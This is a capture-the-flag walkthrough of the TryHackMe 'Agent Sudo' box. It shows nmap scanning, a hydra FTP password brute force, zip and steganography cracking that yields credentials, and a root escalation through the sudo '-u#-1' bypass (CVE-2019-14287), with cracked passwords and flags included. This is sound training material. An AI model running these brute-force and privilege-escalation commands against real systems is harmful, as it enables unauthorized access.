# Agent Sudo

## Enumerate

### nmap

```bash
root@ST:/home/agentsudo# nmap -sC -sV 10.10.111.208
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-29 18:25 UTC
Nmap scan report for 10.10.111.208
Host is up (0.14s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.59 seconds
```

We got message telling us to change user-agent with codename to access the site 

```txt

Dear agents,

Use your own <b>codename</b> as user-agent to access the site.

From,
Agent R
```

I try changing it with A, B and C as code name and got this message for C

```bash
root@ST:/home/agentsudo# curl -L -A "C" 10.10.111.208
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<bri>
Agent R 
```

## Hash cracking and brute-froce

burteforce ftp password

```bash
root@ST:/home/agentsudo# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.111.208
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-29 18:56:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.111.208:21/
[21][ftp] host: 10.10.111.208   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-29 18:58:08
```

Then I logged in ftp using `chris:crystal` and I downloaded all the files

```bash
root@ST:/home/thm/agentsudo# ftp 10.10.111.208
Connected to 10.10.111.208.
220 (vsFTPd 3.0.3)
Name (10.10.111.208:root): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
...
```

then I extract the zip file from cutie.png using binwalk then used zip2john to get zip password in order to crack it

```bash
root@ST:/home/thm/agentsudo# binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

```bash
root@ST:/home/thm/agentsudo/_cutie.png.extracted# zip2john 8702.zip > zip.hash
root@ST:/home/thm/agentsudo/_cutie.png.extracted# cat zip.hash 
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
```

then crack zip password and extract the content

```bash
root@ST:/home/thm/agentsudo# john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:04 DONE (2021-09-29 19:23) 0.2457g/s 6038p/s 6038c/s 6038C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
root@ST:/home/thm/agentsudo# cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

```bash
root@ST:/home/thm/agentsudo# echo QXJlYTUx | base64 -d
Area51
```

```bash
root@ST:/home/thm/agentsudo# steghide extract -sf cute-alien.jpg 
Enter passphrase: Area51 
wrote extracted data to "message.txt".
root@ST:/home/thm/agentsudo# cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

## Capture the user flag

Login to ssh with `james:hackerrules!` to get user flag

```bash
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
```

after running reverse google image search on Alien_autopsy.jpg, I found an artile about the incident 'Roswell alien autopsy'

## Privilege escalation

```
james@agent-sudo:~$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

the user james have sudo right to use `/bin/bash` as root

[exploit-db | CVE-2019-14287](https://www.exploit-db.com/exploits/47502)

I run the exploit to get root access and flag

```
james@agent-sudo:~$ sudo -u#-1 /bin/bash -i
root@agent-sudo:~# cat /root/root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```
